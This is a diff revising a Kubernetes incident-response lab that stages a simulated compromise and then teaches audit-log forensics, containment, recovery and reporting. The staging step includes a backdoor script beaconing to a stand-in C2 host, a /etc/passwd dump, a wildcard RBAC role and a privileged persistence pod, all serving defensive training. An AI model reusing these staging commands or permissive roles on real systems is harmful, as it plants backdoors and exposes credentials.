@@ -1,47 +1,39 @@
 # Lab 12: Incident Response Tabletop
 
-**Duration:** 60 minutes
+**Duration:** 40 minutes
 
 ## Objectives
 
 By the end of this lab, you will be able to:
 
 - Investigate a pre-staged compromise scenario in a Kubernetes cluster
-- Collect forensic evidence from running pods, audit logs, and cluster state
-- Perform containment actions using NetworkPolicies and RBAC modifications
-- Document findings and produce an incident report
+- Collect forensic evidence from pods, audit logs, and RBAC state
+- Investigate lateral movement and secret exfiltration
+- Reconstruct an attack timeline from audit logs using jq
+- Perform containment using NetworkPolicies and RBAC lockdown
+- Execute recovery steps and produce an incident report
 
 ## Prerequisites
 
 - Cloud9 environment with Docker
 - `kubectl` and `kind` installed
 
-## Scenario Overview
+## Scenario
 
-> **Alert:** Your monitoring system has detected unusual activity in the `production` namespace. A Falco alert fired for "shell spawned in container" and your audit logs show unexpected secret access. Your task is to investigate, contain, and document the incident.
+> **Alert:** Your monitoring system has detected unusual activity in the `production` namespace. A Falco alert fired for "shell spawned in container" and audit logs show unexpected secret access. Your task is to investigate, contain, and recover.
 
-## Lab Environment Setup
+---
 
-### Step 1: Create the Incident Cluster
+### Step 1: Create Cluster and Stage the Compromise
 
 ```bash
 # Create cluster with audit logging
 kind create cluster --name ir-lab --config labs/setup/kind-config-audit.yaml
-
-# Wait for the cluster
 kubectl wait --for=condition=Ready nodes --all --timeout=120s
 
-# Install jq for JSON parsing
-sudo yum install -y jq 2>/dev/null || sudo apt-get install -y jq 2>/dev/null
-```
-
-### Step 2: Stage the Compromise Scenario
-
-```bash
-# Create the production namespace
+# Create the production namespace and deploy the "legitimate" application
 kubectl create namespace production
 
-# Deploy the "legitimate" application
 kubectl apply -f - <<EOF
 apiVersion: apps/v1
 kind: Deployment
@@ -83,7 +75,7 @@ metadata:
   namespace: production
 EOF
 
-# Create secrets that a legitimate app would use
+# Create secrets the app uses
 kubectl create secret generic db-credentials -n production \
   --from-literal=host=db.internal.example.com \
   --from-literal=username=app_readonly \
@@ -93,7 +85,7 @@ kubectl create secret generic api-keys -n production \
   --from-literal=stripe-key='sk_live_fake_key_12345' \
   --from-literal=sendgrid-key='SG.fake_key_67890'
 
-# Create an overly permissive RBAC that the "attacker" exploited
+# Create overly permissive RBAC (the vulnerability the attacker exploited)
 kubectl apply -f - <<EOF
 apiVersion: rbac.authorization.k8s.io/v1
 kind: Role
@@ -123,40 +115,37 @@ roleRef:
   apiGroup: rbac.authorization.k8s.io
 EOF
 
-# Wait for pods to be ready
 kubectl wait --for=condition=Ready pods --all -n production --timeout=120s
 
-# Simulate the attack: attacker gets a shell and performs malicious actions
+# Simulate the attack
 ATTACK_POD=$(kubectl get pod -n production -l app=web-app -o jsonpath='{.items[0].metadata.name}')
 
-# Stage evidence of attack
 kubectl exec -n production $ATTACK_POD -- sh -c '
-  # Attacker reads /etc/passwd
   cat /etc/passwd > /tmp/.passwd_dump
-
-  # Attacker creates a reverse shell script
   cat > /tmp/.backdoor.sh << "SHELL"
 #!/bin/sh
 while true; do
   sleep 300
-  # simulated C2 callback
   wget -q -O /dev/null http://evil-c2.attacker.com/beacon 2>/dev/null || true
 done
 SHELL
   chmod +x /tmp/.backdoor.sh
-
-  # Attacker leaves traces
   echo "$(date) - accessed via kubectl exec" >> /tmp/.access_log
   mkdir -p /tmp/.tools
   echo "# crypto miner config" > /tmp/.tools/config.json
 '
 
-# Simulate secret access via the service account
+# Simulate secret exfiltration via the service account
 kubectl get secrets -n production -o yaml > /dev/null 2>&1
 kubectl get secret db-credentials -n production -o jsonpath='{.data.password}' > /dev/null 2>&1
 kubectl get secret api-keys -n production -o jsonpath='{.data.stripe-key}' > /dev/null 2>&1
 
-# Deploy a suspicious pod (attacker's persistence mechanism)
+# Simulate lateral movement attempts — try to access other namespaces
+kubectl get secrets -n kube-system --as system:serviceaccount:production:web-app-sa 2>/dev/null || true
+kubectl get pods -n kube-system --as system:serviceaccount:production:web-app-sa 2>/dev/null || true
+kubectl get configmaps -n default --as system:serviceaccount:production:web-app-sa 2>/dev/null || true
+
+# Deploy attacker persistence pod
 kubectl apply -f - <<EOF
 apiVersion: v1
 kind: Pod
@@ -183,155 +172,167 @@ echo "============================================"
 echo "  INCIDENT SCENARIO STAGED"
 echo "============================================"
 echo ""
-echo "You have received the following alert:"
-echo ""
 echo "  [CRITICAL] Falco Alert: Shell spawned in container"
-echo "  Namespace: production"
-echo "  Pod: $ATTACK_POD"
-echo "  Time: $(date)"
+echo "  Namespace: production | Pod: $ATTACK_POD"
 echo ""
 echo "  [WARNING] Audit Alert: Unusual secret access pattern"
 echo "  User: system:serviceaccount:production:web-app-sa"
-echo "  Resources: db-credentials, api-keys"
 echo ""
-echo "Begin your investigation below."
+echo "  Begin your investigation below."
 echo "============================================"
 ```
 
-## Phase 1: Detection & Triage (10 minutes)
-
-### Step 3: Initial Assessment
+### Step 2: Detection -- Initial Assessment
 
 ```bash
-echo "=== PHASE 1: Detection & Triage ==="
+echo "=== DETECTION: Initial Assessment ==="
 echo ""
 
-# What pods are running in the namespace?
+# What pods are running?
 echo "--- Running Pods ---"
 kubectl get pods -n production -o wide
 
-# Any suspicious pods?
+# Check for suspicious characteristics
 echo ""
 echo "--- Pod Details ---"
 kubectl get pods -n production -o jsonpath='{range .items[*]}Pod: {.metadata.name}  Image: {.spec.containers[0].image}  SA: {.spec.serviceAccountName}  Privileged: {.spec.containers[0].securityContext.privileged}{"\n"}{end}'
-```
 
-**Questions to answer:**
-1. How many pods are running? Are any unexpected?
-2. Are any pods running in privileged mode?
-3. What service accounts are in use?
-
-### Step 4: Check for Suspicious Activity
-
-```bash
-# Look for the suspicious pod
-echo "--- Suspicious Pod Analysis ---"
-kubectl describe pod debug-tools -n production | grep -E "Image:|Privileged:|Service Account:|Started:"
-
-# Check when the pod was created
+# Check namespaces for anything unexpected
 echo ""
-echo "--- Pod Creation Times ---"
-kubectl get pods -n production -o jsonpath='{range .items[*]}{.metadata.name}: {.metadata.creationTimestamp}{"\n"}{end}'
+echo "--- All Namespaces ---"
+kubectl get namespaces
 ```
 
-### Step 5: Review Audit Logs
+Note: The `debug-tools` pod is running a privileged Ubuntu container -- this is highly suspicious in a production namespace.
 
-```bash
-echo "--- Recent Secret Access in Audit Logs ---"
-docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
-  jq -r 'select(.objectRef.resource == "secrets" and .objectRef.namespace == "production") |
-    "  \(.requestReceivedTimestamp // "") | \(.verb | . + " " * (6 - length)) | \(.user.username | . + " " * ([50 - length, 0] | max)) | \(.objectRef.name // "")"' | tail -20
-```
-
-## Phase 2: Investigation (15 minutes)
-
-### Step 6: Investigate the Compromised Pod
+### Step 3: Investigation -- Examine Compromise, RBAC, and Audit Logs
 
 ```bash
 ATTACK_POD=$(kubectl get pod -n production -l app=web-app -o jsonpath='{.items[0].metadata.name}')
 
-echo "=== PHASE 2: Investigation ==="
+echo "=== INVESTIGATION ==="
 echo ""
-echo "--- Investigating pod: $ATTACK_POD ---"
 
-# Check for suspicious files
-echo ""
+# Check for suspicious files on the compromised pod
 echo "--- Hidden files in /tmp ---"
 kubectl exec -n production $ATTACK_POD -- ls -la /tmp/
 
-# Read the backdoor script
 echo ""
 echo "--- Backdoor script content ---"
 kubectl exec -n production $ATTACK_POD -- cat /tmp/.backdoor.sh 2>/dev/null || echo "No backdoor found"
 
-# Check the access log
-echo ""
-echo "--- Access log ---"
-kubectl exec -n production $ATTACK_POD -- cat /tmp/.access_log 2>/dev/null || echo "No access log found"
-
-# Check the tools directory
 echo ""
 echo "--- Attacker tools ---"
-kubectl exec -n production $ATTACK_POD -- ls -la /tmp/.tools/ 2>/dev/null || echo "No tools directory found"
-kubectl exec -n production $ATTACK_POD -- cat /tmp/.tools/config.json 2>/dev/null || echo "No config found"
-```
+kubectl exec -n production $ATTACK_POD -- cat /tmp/.tools/config.json 2>/dev/null || echo "No tools found"
 
-### Step 7: Investigate RBAC Permissions
-
-```bash
-echo "--- RBAC Analysis ---"
-
-# Check the web-app-sa permissions
-echo "Service Account Permissions:"
-kubectl auth can-i --list -n production --as system:serviceaccount:production:web-app-sa | head -20
-
+# Check RBAC permissions
 echo ""
-echo "Can access secrets?"
+echo "--- Service Account Permissions ---"
 kubectl auth can-i get secrets -n production --as system:serviceaccount:production:web-app-sa
-
-echo ""
-echo "Can create pods?"
 kubectl auth can-i create pods -n production --as system:serviceaccount:production:web-app-sa
+kubectl get role web-app-role -n production -o yaml | grep -A 10 "rules:"
 
+# Check audit logs for secret access
 echo ""
-echo "Can modify RBAC?"
-kubectl auth can-i create rolebindings -n production --as system:serviceaccount:production:web-app-sa
+echo "--- Audit Logs: Secret Access ---"
+docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
+  jq -r 'select(.objectRef.resource == "secrets" and .objectRef.namespace == "production") |
+    "  \(.requestReceivedTimestamp // "") | \(.verb) | \(.user.username) | \(.objectRef.name // "")"' | tail -15
 
-# View the actual role
+# Check for cluster-level bindings
 echo ""
-echo "--- Role definition ---"
-kubectl get role web-app-role -n production -o yaml | grep -A 20 "rules:"
-```
-
-### Step 8: Check for Lateral Movement
-
-```bash
-echo "--- Lateral Movement Check ---"
-
-# Check if the SA has cluster-level access
-kubectl auth can-i get pods --all-namespaces --as system:serviceaccount:production:web-app-sa
-kubectl auth can-i get secrets --all-namespaces --as system:serviceaccount:production:web-app-sa
-
-# Check for any ClusterRoleBindings referencing the SA
+echo "--- ClusterRoleBindings for web-app-sa ---"
 kubectl get clusterrolebindings -o json | \
   jq -r '.items[] | select(.subjects[]? | .name == "web-app-sa" and .namespace == "production") |
-    "  ClusterRoleBinding: \(.metadata.name) -> \(.roleRef.name)"' || echo "  No cluster-level bindings found"
-
-# Check for pods running in other namespaces
-echo ""
-echo "--- Pods in all namespaces (check for attacker persistence) ---"
-kubectl get pods --all-namespaces -l purpose=debug 2>/dev/null || echo "  No debug pods found in other namespaces"
+    "  ClusterRoleBinding: \(.metadata.name) -> \(.roleRef.name)"' 2>/dev/null || echo "  No cluster-level bindings found"
 ```
 
-## Phase 3: Containment (10 minutes)
-
-### Step 9: Network Isolation
+### Step 4: Investigate Lateral Movement
 
 ```bash
-echo "=== PHASE 3: Containment ==="
+echo "=== LATERAL MOVEMENT INVESTIGATION ==="
 echo ""
 
-# Apply immediate network isolation
+# Check if the attacker tried to access secrets in other namespaces
+echo "--- Cross-Namespace Secret Access Attempts ---"
+docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
+  jq -r 'select(.objectRef.resource == "secrets" and .objectRef.namespace != "production" and
+    (.user.username | test("web-app-sa"))) |
+    "  \(.requestReceivedTimestamp // "") | \(.verb) \(.objectRef.namespace)/\(.objectRef.name // "*") | status:\(.responseStatus.code // "")"'
+
+# Check for access attempts to other namespaces (any resource)
+echo ""
+echo "--- All Cross-Namespace Access Attempts by web-app-sa ---"
+docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
+  jq -r 'select(.objectRef.namespace != "production" and .objectRef.namespace != null and
+    (.user.username | test("web-app-sa"))) |
+    "  \(.requestReceivedTimestamp // "") | \(.verb) \(.objectRef.resource // "")/\(.objectRef.name // "*") in \(.objectRef.namespace) | status:\(.responseStatus.code // "")"'
+
+# Check if the attacker tried to escalate to cluster-level resources
+echo ""
+echo "--- Cluster-Level Access Attempts ---"
+docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
+  jq -r 'select(.objectRef.namespace == null and .objectRef.resource != null and
+    (.user.username | test("web-app-sa"))) |
+    "  \(.requestReceivedTimestamp // "") | \(.verb) \(.objectRef.resource // "")/\(.objectRef.name // "*") | status:\(.responseStatus.code // "")"' | tail -10
+
+# Check what the debug-tools pod has been doing
+echo ""
+echo "--- Debug-Tools Pod Activity ---"
+docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
+  jq -r 'select(.objectRef.name == "debug-tools") |
+    "  \(.requestReceivedTimestamp // "") | \(.verb) | \(.user.username)"'
+```
+
+### Step 5: Reconstruct Attack Timeline
+
+```bash
+echo "=== ATTACK TIMELINE RECONSTRUCTION ==="
+echo ""
+
+# Build a chronological timeline of all suspicious activity in the production namespace
+echo "--- Full Timeline (production namespace) ---"
+docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
+  jq -r 'select(.objectRef.namespace == "production" and
+    (.verb == "create" or .verb == "delete" or .verb == "get" or .verb == "exec" or
+     .objectRef.subresource == "exec" or .objectRef.resource == "secrets")) |
+    "  \(.requestReceivedTimestamp // "unknown") | \(.verb) \(.objectRef.resource // "")/\(.objectRef.subresource // "")/\(.objectRef.name // "*") | \(.user.username) | status:\(.responseStatus.code // "")"' | sort
+
+# Show just the secret-related timeline
+echo ""
+echo "--- Secret Access Timeline ---"
+docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
+  jq -r 'select(.objectRef.resource == "secrets" and .objectRef.namespace == "production") |
+    "  \(.requestReceivedTimestamp // "unknown") | \(.verb) secret/\(.objectRef.name // "*") | \(.user.username) | status:\(.responseStatus.code // "")"' | sort
+
+# Show exec timeline
+echo ""
+echo "--- Exec Command Timeline ---"
+docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
+  jq -r 'select(.objectRef.subresource == "exec" and .objectRef.namespace == "production") |
+    "  \(.requestReceivedTimestamp // "unknown") | exec into \(.objectRef.name // "unknown") | \(.user.username)"' | sort
+
+# Count suspicious events by type
+echo ""
+echo "--- Event Summary ---"
+echo -n "  Secret access events: "
+docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
+  jq -r 'select(.objectRef.resource == "secrets" and .objectRef.namespace == "production") | .verb' | wc -l
+echo -n "  Exec events: "
+docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
+  jq -r 'select(.objectRef.subresource == "exec" and .objectRef.namespace == "production") | .verb' | wc -l
+echo -n "  Failed requests (403): "
+docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
+  jq -r 'select(.responseStatus.code == 403 and (.user.username | test("web-app-sa"))) | .verb' | wc -l
+```
+
+### Step 6: Containment -- Network Isolation and RBAC Lockdown
+
+```bash
+echo "=== CONTAINMENT ==="
+echo ""
+
+# Apply emergency network isolation
 kubectl apply -f - <<EOF
 apiVersion: networking.k8s.io/v1
 kind: NetworkPolicy
@@ -343,31 +344,17 @@ spec:
   policyTypes:
     - Ingress
     - Egress
-  # Block all traffic — emergency containment
+  # No ingress/egress rules = block all traffic
 EOF
 
-echo "Network isolation applied — all ingress and egress blocked"
-```
+echo "Network isolation applied -- all traffic blocked"
 
-### Step 10: Quarantine the Compromised Pod
-
-```bash
-# Add quarantine label and remove from service
-kubectl label pod $ATTACK_POD -n production quarantine=true
-kubectl label pod $ATTACK_POD -n production app-   # Remove the app label so service stops routing
-
-# Remove the malicious debug pod
+# Remove the attacker's debug pod
 echo ""
 echo "Removing attacker's debug pod..."
 kubectl delete pod debug-tools -n production --grace-period=0 --force
 
-echo "Compromised pod quarantined, malicious pod removed"
-```
-
-### Step 11: Lock Down RBAC
-
-```bash
-# Replace the overly permissive role with a restricted one
+# Lock down RBAC -- replace wildcard permissions with minimal access
 kubectl apply -f - <<EOF
 apiVersion: rbac.authorization.k8s.io/v1
 kind: Role
@@ -380,22 +367,22 @@ rules:
     verbs: ["get"]
 EOF
 
-echo "RBAC locked down — service account now has minimal permissions"
+echo "RBAC locked down -- service account now has minimal permissions"
 
-# Verify the lockdown
+# Verify lockdown
+echo ""
+echo "Can SA still access secrets?"
 kubectl auth can-i get secrets -n production --as system:serviceaccount:production:web-app-sa
-# Expected: no
 ```
 
-## Phase 4: Evidence Collection (10 minutes)
-
-### Step 12: Capture Forensic Evidence
+### Step 7: Evidence Collection
 
 ```bash
-echo "=== PHASE 4: Evidence Collection ==="
+ATTACK_POD=$(kubectl get pod -n production -l app=web-app -o jsonpath='{.items[0].metadata.name}')
+
+echo "=== EVIDENCE COLLECTION ==="
 echo ""
 
-# Create evidence directory
 mkdir -p /tmp/incident-evidence
 
 # Capture pod state
@@ -418,11 +405,7 @@ echo "Saved: rbac-state.yaml"
 docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log > /tmp/incident-evidence/audit-log.json 2>/dev/null
 echo "Saved: audit-log.json"
 
-# Capture network policies
-kubectl get networkpolicies -n production -o yaml > /tmp/incident-evidence/netpol-state.yaml
-echo "Saved: netpol-state.yaml"
-
-# Capture all events
+# Capture events
 kubectl get events -n production --sort-by='.lastTimestamp' > /tmp/incident-evidence/events.txt
 echo "Saved: events.txt"
 
@@ -431,89 +414,117 @@ echo "All evidence collected in /tmp/incident-evidence/"
 ls -la /tmp/incident-evidence/
 ```
 
-### Step 13: Timeline Reconstruction
+### Step 8: Recovery -- Delete Compromised Resources and Verify
 
 ```bash
-echo "=== Incident Timeline ==="
+echo "=== RECOVERY ==="
 echo ""
 
-# Build timeline from audit logs
-cat /tmp/incident-evidence/audit-log.json | \
-  jq -r 'select(.objectRef.namespace == "production" and (.verb == "create" or .verb == "delete" or .verb == "get" or .verb == "update" or .verb == "patch")) |
-    "\(.requestReceivedTimestamp // "")\t\(.verb)\t\(.user.username)\t\((.objectRef.resource // "") + "/" + (.objectRef.name // "") | rtrimstr("/"))"' | \
-  sort | tail -30 | \
-  awk -F'\t' '{printf "  %-30s | %-8s | %-40s | %s\n", $1, $2, substr($3,1,40), $4}' \
-  2>/dev/null || echo "  Unable to parse audit logs"
+# Quarantine and remove the compromised pod
+ATTACK_POD=$(kubectl get pod -n production -l app=web-app -o jsonpath='{.items[0].metadata.name}')
+kubectl label pod $ATTACK_POD -n production app-
+kubectl delete pod $ATTACK_POD -n production --grace-period=0 --force
+echo "Compromised pod removed"
+
+# Restart the deployment to get clean pods
+kubectl rollout restart deployment web-app -n production
+kubectl wait --for=condition=Ready pods -l app=web-app -n production --timeout=60s
+
+# Remove the emergency network policy (in production you would replace with a proper one)
+kubectl delete networkpolicy emergency-isolate -n production
+
+echo ""
+echo "--- Verification: Cluster State ---"
+kubectl get pods -n production
+echo ""
+kubectl get pods --all-namespaces -l purpose=debug 2>/dev/null || echo "No debug pods found anywhere"
+echo ""
+echo "Can SA access secrets?"
+kubectl auth can-i get secrets -n production --as system:serviceaccount:production:web-app-sa
+echo ""
+echo "Recovery complete. In a real incident, you would also:"
+echo "  - Rotate all exposed credentials (db-credentials, api-keys)"
+echo "  - Review and harden all service account permissions"
+echo "  - Deploy Pod Security Standards to prevent privileged pods"
 ```
 
-## Phase 5: Documentation (15 minutes)
-
-### Step 14: Create the Incident Report
+### Step 9: Create Incident Report
 
 ```bash
-cat > /tmp/incident-evidence/incident-report.md <<'REPORT'
-# Incident Report
+echo "=== GENERATING INCIDENT REPORT ==="
+echo ""
 
-## Incident Summary
-- **Incident ID:** IR-2024-001
-- **Severity:** Critical
-- **Status:** Contained
-- **Detection Time:** [timestamp of first alert]
-- **Containment Time:** [timestamp of containment actions]
+# Count key metrics from the saved audit log for the report
+SECRET_EVENTS=$(cat /tmp/incident-evidence/audit-log.json | \
+  jq -r 'select(.objectRef.resource == "secrets" and .objectRef.namespace == "production") | .verb' | wc -l)
+EXEC_EVENTS=$(cat /tmp/incident-evidence/audit-log.json | \
+  jq -r 'select(.objectRef.subresource == "exec" and .objectRef.namespace == "production") | .verb' | wc -l)
+LATERAL_ATTEMPTS=$(cat /tmp/incident-evidence/audit-log.json | \
+  jq -r 'select(.objectRef.namespace != "production" and .objectRef.namespace != null and
+    (.user.username | test("web-app-sa"))) | .verb' 2>/dev/null | wc -l)
+FIRST_EVENT=$(cat /tmp/incident-evidence/audit-log.json | \
+  jq -r 'select(.objectRef.namespace == "production" and .objectRef.subresource == "exec") |
+    .requestReceivedTimestamp' | sort | head -1)
+LAST_EVENT=$(cat /tmp/incident-evidence/audit-log.json | \
+  jq -r 'select(.objectRef.namespace == "production" and (.objectRef.resource == "secrets" or .objectRef.subresource == "exec")) |
+    .requestReceivedTimestamp' | sort | tail -1)
 
-## What Happened
-An attacker gained shell access to a production web application container.
-Using the overly permissive service account role, the attacker:
-1. Accessed production secrets (database credentials, API keys)
-2. Deployed a privileged "debug" pod for persistence
-3. Created a backdoor script for C2 communication
-4. Staged crypto mining tools
+cat > /tmp/incident-evidence/incident-report.txt <<EOF
+========================================
+KUBERNETES SECURITY INCIDENT REPORT
+========================================
 
-## Root Cause
-The `web-app-role` Role granted wildcard permissions (`*` on all resources/verbs)
-to the web application service account. This violated the principle of least
-privilege and allowed the attacker to access secrets and create pods.
+Incident ID:    IR-$(date +%Y%m%d)-001
+Date:           $(date -u +"%Y-%m-%d %H:%M UTC")
+Severity:       CRITICAL
+Status:         RESOLVED
 
-## Impact
-- **Credentials Exposed:** db-credentials, api-keys
-- **Data at Risk:** Database access via exposed credentials
-- **Persistence:** Privileged debug pod and backdoor script
+--- SUMMARY ---
+An attacker gained access to a container in the production namespace
+via overly permissive RBAC (wildcard rules on the web-app-sa service
+account). The attacker executed commands in the container, planted a
+backdoor script, deployed a privileged persistence pod, and
+exfiltrated secrets.
 
-## Containment Actions Taken
-1. Applied emergency NetworkPolicy to block all traffic
-2. Quarantined compromised pod (removed from service)
-3. Deleted attacker's debug pod
-4. Replaced wildcard RBAC with minimal permissions
+--- TIMELINE ---
+First exec event:   ${FIRST_EVENT:-unknown}
+Last known activity: ${LAST_EVENT:-unknown}
 
-## Evidence Collected
-- Pod YAML manifest
-- Container filesystem artifacts (/tmp/ contents)
-- Audit logs
-- RBAC configuration
-- Network policy state
-- Kubernetes events
+--- IMPACT ---
+Secret access events:        ${SECRET_EVENTS}
+Exec events:                 ${EXEC_EVENTS}
+Lateral movement attempts:   ${LATERAL_ATTEMPTS}
+Secrets potentially exposed: db-credentials, api-keys
+Persistence mechanism:       Privileged pod (debug-tools)
 
-## Remediation Recommendations
-1. **Immediate:** Rotate all exposed credentials (db-credentials, api-keys)
-2. **Immediate:** Review and restrict all service account permissions
-3. **Short-term:** Implement Pod Security Standards (Restricted)
-4. **Short-term:** Deploy Falco for runtime detection
-5. **Medium-term:** Implement NetworkPolicies for all namespaces
-6. **Medium-term:** Enable and monitor audit logging
-7. **Long-term:** Implement admission controllers to prevent privileged pods
+--- ROOT CAUSE ---
+The web-app-role Role granted wildcard permissions ("*" on all
+resources and verbs), allowing the compromised service account to
+read secrets, create pods, and attempt cross-namespace access.
 
-## Lessons Learned
-- Wildcard RBAC permissions are extremely dangerous
-- Privileged pods should never be allowed in production
-- Runtime security monitoring (Falco) could have detected this sooner
-- Network policies would have limited lateral movement
-REPORT
+--- CONTAINMENT ACTIONS ---
+1. Applied emergency NetworkPolicy (deny-all ingress/egress)
+2. Removed attacker persistence pod (debug-tools)
+3. Locked down RBAC to minimal permissions (configmap get only)
 
-echo "Incident report created at /tmp/incident-evidence/incident-report.md"
-cat /tmp/incident-evidence/incident-report.md
+--- RECOVERY ACTIONS ---
+1. Removed compromised pod
+2. Restarted deployment with clean pods
+3. Removed emergency network policy
+
+--- RECOMMENDED FOLLOW-UP ---
+1. Rotate ALL secrets in the production namespace immediately
+2. Enforce Pod Security Standards (Restricted) on production
+3. Implement least-privilege RBAC for all service accounts
+4. Deploy Falco or similar runtime monitoring
+5. Schedule quarterly incident response drills
+========================================
+EOF
+
+cat /tmp/incident-evidence/incident-report.txt
 ```
 
-## Cleanup
+### Step 10: Cleanup
 
 ```bash
 # Delete the production namespace
@@ -528,11 +539,8 @@ kind delete cluster --name ir-lab
 
 ## Summary
 
-In this lab, you:
-- Investigated a pre-staged compromise scenario with realistic attack artifacts
-- Collected forensic evidence from containers, audit logs, and cluster state
-- Performed containment using NetworkPolicies, pod quarantine, and RBAC lockdown
-- Reconstructed an incident timeline from audit logs
-- Created a comprehensive incident report with root cause and remediation recommendations
-
-Key takeaway: Incident response in Kubernetes requires familiarity with kubectl forensics, audit logs, and rapid containment techniques. Regular tabletop exercises build the muscle memory needed when real incidents occur.
+- Overly permissive RBAC (wildcard rules) was the root cause that allowed the attacker to access secrets and create privileged pods
+- Audit logs combined with jq enable reconstructing a full attack timeline, including lateral movement attempts across namespaces
+- Containment requires both network isolation (NetworkPolicy) and RBAC lockdown to cut off attacker access
+- Always collect forensic evidence (pod state, filesystem, audit logs) before deleting compromised resources
+- An incident report documenting timeline, impact, root cause, and follow-up actions is critical for organizational learning
